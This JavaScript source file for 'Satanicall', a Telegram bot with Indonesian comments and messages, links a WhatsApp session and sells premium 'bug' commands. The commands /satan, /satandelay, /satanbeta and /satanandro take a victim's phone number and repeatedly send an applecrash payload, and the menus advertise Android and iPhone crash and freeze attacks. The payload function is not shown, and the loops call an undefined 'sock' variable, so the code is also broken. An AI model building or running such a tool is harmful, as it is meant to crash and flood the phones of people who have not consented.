const { Telegraf, Markup, session } = require("telegraf");
const {
  makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  encodeSignedDeviceIdentity,
  fetchLatestBaileysVersion,
  prepareWAMessageMedia,
  proto,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const thumbnail = fs.readFileSync('./2.jpg'); 
const config = require("./config.js");
const { BOT_TOKEN } = require("./config");
const crypto = require("crypto");
const premiumFile = "./premiumuser.json";
const adminFile = "./adminuser.json";
const TOKENS_FILE = "./tokens.json";

const { execSync } = require('child_process');
const sessionPath = './session';


const sessions = new Map();
const bot = new Telegraf(BOT_TOKEN);

bot.use(session());
let bots = [];

let anas;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
const randomImages = [
    "https://files.catbox.moe/8tbxdn.jpeg",

  ];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
async function generateFile(filePath, sizeMB) {
  if (!fs.existsSync(filePath)) {
    try {
      execSync(`dd if=/dev/zero of="${filePath}" bs=1M count=${sizeMB} status=none`);
    } catch (err) {
      throw new Error("❌ Gagal membuat file dummy.");
    }
  }
}


/////////// UNTUK MENYIMPAN DATA CD \\\\\\\\\\\\\\
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}



function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  new Date().getTime()  // ✅ Benar
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "NewDb");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}
//////// FUNGSI VALID TOKEN \\\\\\\\\

function startBot() {
  console.log(
    chalk.bold.blue(` 
┏━━[ 𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕]
┃ De𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝐀𝐦𝐛𝐚𝐤𝐲𝐲
┃ 𝖵𝖾𝗋𝗌𝗂 : 1.0.0
┃ 𝖳𝗒𝗉𝖾 : Button
┗━━━━━━━━━━━━━━━❂	
`));
  console.log(
    chalk.bold.red(`Bot Active Now !!!
    `));
}



/////  Koneksi WhatsApp  \\\\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  anas = makeWASocket(connectionOptions);

  anas.ev.on("creds.update", saveCreds);
  

  anas.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`

  ${chalk.green.bold("WHATSAPP TERHUBUNG")}
`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`
 ${chalk.red.bold("WHATSAPP TERPUTUS")}
`),
        shouldReconnect
          ? chalk.white.bold(`
 ${chalk.red.bold("HUBUNGKAN ULANG")}
`)
          : ""
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};







const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
/////==== Tap to reply ====\\\\\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("💢 WhatsApp belum terhubung njirr, pairing dulu lah, /addpairing...");
    return;
  }
  next();
};

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
// Muat ID owner dan pengguna premium
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
const userId = ctx.from.id;
const chatId = ctx.chat.id;

  if (!isOwner(ctx.from.id)) {
    return ctx.reply("💢 Lu siapa? Pea Owner Aja Bukan Kontoll...");
  }
  next();
};
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin"
    );
  }
  next();
};
// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Premin Dlu Sama Own Lu Bangsad...");
  }
  next();
};
//  Fungsi untuk Menambahkan Admin 
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

//  Fungsi untuk Menghapus Admin 
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

//  Fungsi untuk Menyimpan Daftar Admin 
const saveAdmins = () => {
  fs.writeFileSync("./admins.json", JSON.stringify(adminList));
};

//  Fungsi untuk Memuat Daftar Admin 
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};

// -- Fungsi Memuat Daftar Owner
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}



bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);

  const mainMenuMessage = `
<blockquote>▢「 𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕 」</blockquote>

<blockquote>□ り乇√乇ﾚのｱ乇尺 : <a href="https://t.me/KyyOffc1">@KyyOffc1</a></blockquote>
<blockquote>□ √乇尺丂ﾉの刀 : 1.0.0</blockquote>
<blockquote>□ ﾚﾑ刀ムひﾑム乇 : JavaScript</blockquote>

<blockquote>▢丂ｲﾑｲひ丂 : ${isPremium ? "Premium" : "No"}</blockquote>

<blockquote>▢( ! ) ༑丂ᴇʟʟᴇᴄᴛ 乃ᴜᴛᴛᴏɴ 乃ᴇʟᴏ</blockquote>
`;

  const mainKeyboard = [
    [
      { text: "のᴡɴᴇʀ ﾶᴇɴᴜ", callback_data: "owner_menu" },
      { text: "乃ᴜɢ ﾶᴇɴᴜ", callback_data: "bug_menu" },
    ],
    [
      { text: "ｲʜᴀɴᴋ丂 ｷᴏʀ 丂ᴜᴘᴘᴏʀᴛ", callback_data: "thanks" },
    ],
    [
      { text: "りᴇᴠᴇʟᴏᴘᴇʀ 𝐀𝐦𝐛𝐚𝐤𝐲𝐲", url: "https://t.me/KyyOffc1" },
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: mainKeyboard },
  });
});

bot.action("owner_menu", async (ctx) => {
  const mainMenuMessage = `
  <blockquote>▢「 𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕 」</blockquote>

╭━─━─  <blockquote>▢ (Owner Menu)  </blockquote>
┃/addprem
╰➤   <blockquote>▢ akses premium  </blockquote>
┃/delprem
╰➤  <blockquote>▢  delete premium  </blockquote>
┃/addadmin
╰➤    <blockquote>▢akses admin  </blockquote>
┃/deladmin
╰➤    <blockquote>▢delete admin  </blockquote>
┃/delsesi
╰➤    <blockquote>▢hapus session  </blockquote>
┃/restart
╰➤   <blockquote>▢ restart bot  </blockquote>
┃/setjeda
╰➤    <blockquote>▢cooldown  </blockquote>
┃/addpairing
╰➤    <blockquote>▢connect bot  </blockquote>
╰━━━━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML",
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const mainMenuMessage = `
  <blockquote>▢「 𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕 」</blockquote>

╭━(   <blockquote>▢乃ᴜɢ ﾶᴇɴᴜ  </blockquote> )
┃/satan
╰➤  <blockquote>▢Delay Duration + Blank  </blockquote>
┃/satandelay
╰➤      <blockquote>▢Delay High  </blockquote>
┃/satanbeta
╰➤    <blockquote>Beta Breaker  </blockquote>
┃/satanandro
╰➤    <blockquote>▢Andro Crash  </blockquote>
┃/satanip
╰➤    <blockquote>▢Iphone Crash  </blockquote>
┃/satanip2
╰➤    <blockquote>▢Iphone Delay Freeze  </blockquote>
┃/satanigall
╰➤    <blockquote>▢Satanic Blank  </blockquote>
╰━━━━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML",
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("thanks", async (ctx) => {
  const mainMenuMessage = `
  <blockquote>▢「 𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕 」</blockquote>

╭━( Tʜᴀɴᴋs Tᴏ )
┃  <blockquote>Allah SWT  </blockquote>
┃  <blockquote>My Parents  </blockquote>
┃  <blockquote>𝐀𝐦𝐛𝐚𝐤𝐲𝐲 ( Developer )  </blockquote>
┃  <blockquote>Hadi ( My Friend )  </blockquote>
╰━━━━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML",
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);

  const mainMenuMessage = `
<blockquote>▢「 𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕 」</blockquote>

<blockquote>□ り乇√乇ﾚのｱ乇尺 : <a href="https://t.me/KyyOffc1">@KyyOffc1</a></blockquote>
<blockquote>□ √乇尺丂ﾉの刀 : 1.0.0</blockquote>
<blockquote>□ ﾚﾑ刀ムひﾑム乇 : JavaScript</blockquote>

<blockquote>▢丂ｲﾑｲひ丂 : ${isPremium ? "Premium" : "No"}</blockquote>

<blockquote>▢( ! ) ༑丂ᴇʟʟᴇᴄᴛ 乃ᴜᴛᴛᴏɴ 乃ᴇʟᴏ</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML",
  };

  const mainKeyboard = [
    [
      { text: "のᴡɴᴇʀ ﾶᴇɴᴜ", callback_data: "owner_menu" },
      { text: "乃ᴜɢ ﾶᴇɴᴜ", callback_data: "bug_menu" },
    ],
    [
      { text: "ｲʜᴀɴᴋ丂 ｷᴏʀ 丂ᴜᴘᴘᴏʀᴛ", callback_data: "thanks" },
    ],
    [
      { text: "りᴇᴠᴇʟᴏᴘᴇʀ 𝐀𝐦𝐛𝐚𝐤𝐲𝐲", url: "https://t.me/KyyOffc1" },
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

bot.command("satan", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevo 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "HTML",
    }
  );

  // Tanpa setTimeout, semua pembaruan caption ini akan terjadi secara instan
  // Pengguna mungkin hanya melihat status terakhir
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai (tanpa penundaan)
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  // Semua panggilan NoInvis akan terjadi secepat mungkin tanpa jeda
  for (let i = 0; i < 100; i++) {
    await applecrash(sock, target);
    
    console.log(chalk.red.bold(`𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕Sending Bug ${i + 1}/10 To ${target}`));
  }
});



bot.command("satandelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevodelay 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "HTML",
    }
  );

  // Tanpa setTimeout, semua pembaruan caption ini akan terjadi secara instan
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%

`,
    { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "HTML" }
  );
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%

`,
    { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "HTML" }
  );
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%

`,
    { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "HTML" }
  );
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%

`,
    { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "HTML" }
  );
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%

`,
    { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "HTML" }
  );
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai (tanpa penundaan)
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
      await applecrash(sock, target);
      await applecrash(sock, target);
      await applecrash(sock, target);
      await applecrash(sock, target);
      
    console.log(chalk.red.bold(`𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕Sending Bug ${i + 1}/100 To ${target}`));
  }
});



bot.command("satanbeta", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevolow 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "HTML",
    }
  );

  // Tanpa setTimeout, semua pembaruan caption ini akan terjadi secara instan
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai (tanpa penundaan)
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
      await applecrash(sock, target);
      await applecrash(sock, target);
      await applecrash(sock, target);
      
    console.log(chalk.red.bold(`𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕Sending Bug ${i + 1}/100 To ${target}`));
  }

});



bot.command("satanandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevobeta 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "HTML",
    }
  );

  // Tanpa setTimeout, semua pembaruan caption ini akan terjadi secara instan
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
